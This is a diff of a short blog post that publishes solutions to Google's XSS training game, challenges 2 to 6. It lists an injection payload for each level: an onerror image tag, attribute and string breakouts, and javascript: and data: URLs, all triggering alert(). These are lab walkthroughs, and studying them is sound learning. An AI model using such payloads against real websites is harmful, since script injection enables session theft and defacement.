@@ -1,27 +1,34 @@
 ---
 layout:     post
 title:      "Xss is old but gold!"
-subtitle:   "Google xss challenge!"
-date:       2015-09-13 10:47:00
+subtitle:   "Google xss challenge Solution!"
+date:       2015-10-06 16:47:00
 author:     "Heeraj"
 header-img: "img/post-bg-02.jpg"
 ---
-<p> If you like to read our old blogs you are welcome, <a href="http://heeraj123.wordpress.com">I4INFO</a> Want to be a member of our team, contact us! </p>
+<p> If you like to read our old blogs you are welcome, <a href="http://heeraj123.wordpress.com">I4INFO</a> </p>
 
-<p>Xss - cross site scripting, may be an old security bug but what it can do is even dangerous in todays senario.</p>
+<p>Google XSS challenge solution!</p>
 
-<p>Its intresting if someone is wants to learn xss. Its a good chance now the google is hosting xss challenge by them.
-One xss bug in google can give you $7500. </p>
+<p>Challenge 2</p>
 
-<blockquote>" I may be an alert() , when I will be a big bang! "</blockquote>
+<blockquote>"ptr=&#x3C;img src=&#x22;hrj&#x22; onerror=&#x22;alert(&#x22;xss&#x22;)&#x3E;"</blockquote>
 
-<p>The challenge is available in <a href="https://xss-game.appspot.com/level2">xss-game</a> hosted by google.<p>
+<p>Challenge 3</p>
 
-<p>It would be an intresting challenge to solve . I will come up will the solution in my next blog.<p>
+<blockquote>&#x27; onerror=&#x27;alert(&#x22;xss&#x22;)&#x27;&#x3E;</blockquote>
 
-<p>The solution for the first blog is quite simple</p>
+<p>Challenge 4</p>
 
-<blockquote>&#x3C;srcipt&#x3E;alert(1)&#x3C;/script&#x3E;</blockquote>
+<blockquote>');alert('xss</blockquote>
+
+<p>Challenge 5</p>
+
+<blockquote>javascript%3Aalert(%22xss%22)</blockquote>
+
+<p>Challenge 6</p>
+
+<blockquote>#data:text/plain,alert('xss')</p>
 
 <p>Stay tuned!<br> Untill we come with our another blog!</p>
 
